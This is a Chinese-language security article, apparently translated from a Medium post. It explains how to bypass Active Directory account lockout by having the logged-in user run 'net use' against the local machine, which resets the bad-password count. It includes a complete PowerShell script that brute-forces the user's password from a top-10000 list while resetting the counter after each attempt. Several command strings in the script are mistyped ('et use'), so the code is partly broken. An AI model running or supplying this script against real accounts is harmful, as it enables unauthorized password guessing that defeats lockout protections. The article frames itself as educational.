***本文仅用于教育目的。 切勿在未授权的计算机上进行安全测试。**

 **获取用户帐户密码有很多好方法，这只是另一种方式。 好的，让我们开始吧。核心思路是，用户想要爆破身份验证，他们就可以运行“net use
\\\％computername％/
u：％username％”命令，该命令可以重新要求身份验证并重置锁定计数。要想进行操作，您需要从Microsoft下载[远程服务器管理工具](https://www.microsoft.com/en-us/download/details.aspx?id=45520)安装该工具后，运行一小段powershell脚本以显示我的JoeUser帐户信息并锁定。**

    
    
    get-aduser -filter * -prop lastbadpasswordattempt, badpwdcount, lockedout | select name, lastbadpasswordattempt, badpwdcount,lockedout | format-table -auto

![绕过域账户认证失败锁定次数限制的技巧](https://image.3001.net/images/20190425/1556187488_5cc1896003408.png!small)在我的本地策略中，您可以看到我在3次无效登录尝试后被锁定（我从Microsoft获得的默认安装值）。  
![绕过域账户认证失败锁定次数限制的技巧](https://image.3001.net/images/20190425/1556187496_5cc189684676c.png!small)接下来我将输入错误的密码，window将记录我的错误次数。  
![绕过域账户认证失败锁定次数限制的技巧](https://image.3001.net/images/20190425/1556187502_5cc1896e7f1ea.png!small)现在我将使用命令清除错误的密码尝试：`“Net
use \\％computername％/ u：％username％”`注意我没有指定密码。
我已经以用户身份登录，它似乎使用当前用户的上下文进行身份验证，并清除了错误的密码计数！  
![绕过域账户认证失败锁定次数限制的技巧](https://image.3001.net/images/20190425/1556187510_5cc18976a093d.png!small)现在我可以使用这种技术爆破密码。
唯一的缺点是我必须在每次设置后删除共享。 例如，现在我已经进行了共享设置，如果我尝试爆破密码，我会收到此消息  
![绕过域账户认证失败锁定次数限制的技巧](https://image.3001.net/images/20190425/1556187520_5cc18980834e6.png!small)然而只需一条命令即可`“Net
Use /Delete \\%computername%”`  
![绕过域账户认证失败锁定次数限制的技巧](https://image.3001.net/images/20190425/1556187525_5cc18985f1828.png!small)正式测试，我使用Daniel
Miesslers SecLists的前10000名密码[列表](a%20href=)来爆破。正确的密码也在里面。

    
    
    $userVar = Get-ChildItem env:username
    $uname = $userVar.Value
    $computerVar = Get-ChildItem env:computername
    $computerName = $computerVar.Value
    $ErrorActionPreference = "Stop"
    $hooray = "PasswordNotFoun"
    $CurrentPath = "C:\Users\Public"
    $FileName = "10-million-password-list-top-10000.txt"
    $FName= "$CurrentPath\$FileName"
    foreach($value in [System.IO.File]::ReadLines($Fname))
    {
        $passAttempt = ('net use \\' + $computerName + ' "' + $value + '"' + '/u:' + $uname )
        try
        {
            Write-Output ("trying password " + $value)
            $output = Invoke-Expression $passAttempt | Out-Null
            $hooray = $value
            write-output ("FOUND the user password: " + $value)
            $reset = ('et use \\' + $computername + ' /u:'+ $uname )
            Invoke-Expression $reset | Out-Null
            $deleteShare = ('net use /delete \\' + $computername )
            Invoke-Expression $deleteShare | Out-Null
            break
        }
        catch
        {
            $reset = ('et use \\' + $computername + '/u:' + $uname )
            Invoke-Expression $reset | Out-Null
            $deleteShare = ('et use /delete \\'+ $computername )
            Invoke-Expression $deleteShare | Out-Null
        }
    }
    write-host "The Password is: "$hooray
    

  
![绕过域账户认证失败锁定次数限制的技巧](https://image.3001.net/images/20190425/1556187651_5cc18a03e598a.png!small)成功爆破  
  
***参考来源：[medium](https://medium.com/@markmotig/bypassing-ad-account-lockout-for-a-compromised-account-5c908d663de8)，FB小编周大涛编译，转载请注明来自FreeBuf.COM**  

